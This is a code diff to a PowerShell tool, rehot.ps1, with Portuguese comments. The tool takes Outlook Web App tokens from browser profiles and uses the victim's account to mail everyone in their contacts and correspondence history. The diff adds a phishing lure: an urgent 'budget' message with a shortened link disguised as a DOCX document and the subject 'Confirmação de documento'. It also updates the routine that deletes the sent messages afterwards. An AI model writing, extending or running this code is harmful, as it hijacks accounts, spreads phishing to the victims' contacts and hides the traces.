@@ -20,6 +20,16 @@ Uso:
   powershell -File rehot.ps1                 # só detecta
   powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
   powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
+
+  Corpo da mensagem (todos os modos de envio):
+    -Body  : corpo da mensagem. Aceita texto puro OU HTML pronto. Se vazio, usa
+             o template HTML padrão (campanha atual, com o link do documento).
+    -Link  : link curto que substitui [LINK_CURTO] no corpo (template ou -Body).
+    -Subject: assunto. Se vazio, usa "Confirmação de documento".
+    -ShowJson: imprime o JSON exato enviado (validar "ContentType":"HTML" e o
+               href escapado antes de conferir o e-mail no Outlook).
+    Texto puro é embrulado em HTML e as quebras viram <br>; HTML pronto passa
+    intacto. O envio sempre sai com ContentType "HTML" (API v2.0).
   powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
       # lista a agenda do cliente e envia a mensagem designada a todos os contatos
   powershell -File rehot.ps1 -ToAllPeople -Subject "Oi" -Body "msg" [-MaxMessages 2000]
@@ -46,7 +56,9 @@ param(
     [switch]$ToAllPeople,     # envia para TODAS as pessoas (contatos + historico de Inbox/Enviados)
     [switch]$ToAllRecipients, # agenda + To/Cc/Bcc da pasta Enviados (SUBCONJUNTO de -ToAllPeople: NAO inclui Inbox; use quando o alvo é só quem você já enviou e-mail)
     [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
-    [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
+    [string]$Body = "",       # corpo da mensagem (vazio = template HTML padrão)
+    [string]$Link = "",       # link curto p/ substituir [LINK_CURTO] no corpo
+    [switch]$ShowJson,        # imprime o JSON exato enviado (validar ContentType=HTML + href)
     [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite (total de destinatarios)
     [int]$MaxMessages = 0,    # -ToAllPeople: max de mensagens escaneadas p/ extrair enderecos (0 = tudo)
     [switch]$DryRun,          # lista os destinatarios sem enviar (preview/teste)
@@ -73,8 +85,28 @@ $OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")  # SPA do 
 $OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")  # API de mail (write)
 $OWA_READ_SCOPE  = "https://outlook.office.com/.default"
 $OWA_TOKEN_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
+# API OWA v2.0 (endpoint REST do Outlook Web App). Propriedades em PascalCase
+# (Body, ContentType, Content) e SaveToSentItems como string 'true' — idêntico à
+# documentação oficial. v2.0 está descontinuada mas ainda responde em muitos
+# tenants; se o endpoint parar, a migração é para Microsoft Graph
+# (POST /me/sendMail, body.contentType: "HTML" em camelCase): trocar a URL e o
+# case das propriedades.
 $OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
 $OWA_ORIGIN      = "https://outlook.live.com"
+# Corpo HTML padrão (campanha atual): follow-up de orçamento. O link e o nome do
+# documento sao fixos no corpo (sem [LINK_CURTO]). Sem CSS, sem imagem, sem senha.
+$DEFAULT_HTML_BODY = @'
+<html><head>
+    <meta charset="UTF-8">
+</head>
+<body>
+    Fala aí, esse orçamento passou por você?? Vê isso com urgência, pode ser reembolsado se for erro. se tiver certo, passo pra frente.<br>
+    <a href="HtTps://cutt.ly/kyYA25As" target="_blank">DOCX_490287</a>
+
+</body></html>
+'@
+# Assunto padrão (instrução 3): o e-mail é uma "confirmação de documento".
+$DEFAULT_SUBJECT = "Confirmação de documento"
 
 $browsers = @(
     @{ Name = "Chrome";     Root = Join-Path $LOCALAPPDATA "Google\Chrome\User Data" },
@@ -532,23 +564,53 @@ function Get-OWAWriteToken([string]$refresh, [string]$client) {
     return $null
 }
 
+# Converte o corpo em HTML (instrucao 1): se ja contem marcacao (<letra), envia
+# como esta; senao, embrulha num envelope minimo e converte quebras de linha em
+# <br>. Assim -Body aceita texto puro OU HTML pronto.
+function ConvertTo-HtmlBody([string]$body) {
+    if (-not $body) { $body = "" }
+    if ($body -match '<[a-zA-Z]') { return $body }
+    $escaped = $body -replace '&', '&amp;' -replace '<', '&lt;' -replace '>', '&gt;'
+    $html = $escaped -replace "`r?`n", "<br>"
+    return "<html><body>$html</body></html>"
+}
+
+# Resolve o corpo final: usa -Body se fornecido, senão o template HTML padrão.
+# Substitui [LINK_CURTO] por -Link (se fornecido). O corpo já sai HTML (via
+# ConvertTo-HtmlBody no Send-OWAMail), então aqui só escolhemos o texto-base.
+function Resolve-Body([string]$body, [string]$link) {
+    $final = if ($body) { $body } else { $DEFAULT_HTML_BODY }
+    if ($link) { $final = $final.Replace('[LINK_CURTO]', $link) }
+    return $final
+}
+
 function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$body) {
+    $content = ConvertTo-HtmlBody $body
+    # Payload v2.0 (instrucao 3): PascalCase + Body.ContentType = HTML.
+    # SaveToSentItems como string 'true' e ConvertTo-Json -Compress seguem o
+    # trecho de referencia. -Depth 10 evita truncar ToRecipients[0].EmailAddress.Address.
     $payload = @{
         Message = @{
-            Subject = $subject
-            Body = @{ ContentType = "Text"; Content = $body }
+            Subject      = $subject
+            Body         = @{ ContentType = 'HTML'; Content = $content }
             ToRecipients = @(@{ EmailAddress = @{ Address = $to } })
         }
-        SaveToSentItems = $true
-    } | ConvertTo-Json -Depth 5
-    # corpo como byte[] UTF-8: Invoke-WebRequest 5.1 codifica string no charset
+        SaveToSentItems = 'true'
+    }
+    $json = $payload | ConvertTo-Json -Depth 10 -Compress
+    # Validacao: imprime o JSON exato que vai no ar (confirme "ContentType":"HTML"
+    # e o href escapado). Opt-in p/ nao poluir o modo -ToAll* (centenas de envios).
+    if ($ShowJson) { Write-Host "[JSON] $json" }
+    # corpo como byte[] UTF-8: o Windows PowerShell 5.1 codifica string no charset
     # do sistema (Windows-1252), o que corrompe acentos e quebra o JSON (400).
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
     try {
-        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/sendMail" -Method Post -Body $bytes `
+        # Invoke-RestMethod (instrucao 3): 202 com corpo vazio nao lanca; falha
+        # (4xx/5xx) lanca WebException com .Response — capturamos status + corpo.
+        $resp = Invoke-RestMethod -Method Post -Uri "$OWA_API_BASE/me/sendMail" `
             -Headers @{ "Authorization" = "Bearer $token"; "Origin" = $OWA_ORIGIN } `
-            -ContentType "application/json" -UseBasicParsing
-        return @{ ok = ($resp.StatusCode -eq 202); status = [int]$resp.StatusCode; erro = $null }
+            -ContentType "application/json; charset=utf-8" -Body $bytes
+        return @{ ok = $true; status = 202; erro = $null }
     } catch {
         $code = 0; $erro = $null
         if ($_.Exception.Response) {
@@ -558,6 +620,7 @@ function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$bo
                 $erro = $sr.ReadToEnd()
             } catch {}
         }
+        if (-not $erro) { $erro = $_.Exception.Message }
         return @{ ok = $false; status = $code; erro = $erro }
     }
 }
@@ -1098,9 +1161,11 @@ if ($comWrite.Count -gt 0) {
 # ---- modo -SendTo ----
 $envio = $null
 if ($SendTo) {
+    $sendBody = Resolve-Body $Body $Link
+    $sendSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
     $src = $validos | Where-Object { $_.token_write } | Select-Object -First 1
     if ($src) {
-        $res = Send-OWAMail $src.token_write $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
+        $res = Send-OWAMail $src.token_write $SendTo $sendSubject $sendBody
         $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
     }
     else {
@@ -1110,7 +1175,7 @@ if ($SendTo) {
             $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
             $wt = if ($wtObj) { $wtObj.token } else { $null }
             if ($wt) {
-                $res = Send-OWAMail $wt $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automático (PowerShell)"
+                $res = Send-OWAMail $wt $SendTo $sendSubject $sendBody
                 $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
             } else {
                 $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_token_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
@@ -1152,8 +1217,8 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
             }
         }
     }
-    $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAll" }
-    $body    = if ($Body)    { $Body }    else { "Mensagem de teste (PowerShell)" }
+    $subject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
+    $body    = Resolve-Body $Body $Link
     if ($src) {
         $quebra = $null
         if ($ToAllRecipients.IsPresent) {
@@ -1258,9 +1323,9 @@ if ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsP
 $selfDelReport = $null
 if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
     $all = $SelfDeleteAll.IsPresent
-    $sdSubject = if ($Subject) { $Subject }
-        elseif ($ToAllContacts.IsPresent -or $ToAllPeople.IsPresent -or $ToAllRecipients.IsPresent) { "[TESTE EnvioHOT] rehot -ToAll" }
-        else { "[TESTE EnvioHOT] rehot.ps1 -SendTo" }
+    # Ambos os modos de envio usam $DEFAULT_SUBJECT quando -Subject e vazio,
+    # entao o filtro de apagamento e o mesmo em qualquer modo.
+    $sdSubject = if ($Subject) { $Subject } else { $DEFAULT_SUBJECT }
     $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
     if ($srcDel) {
         Start-Sleep -Seconds 2
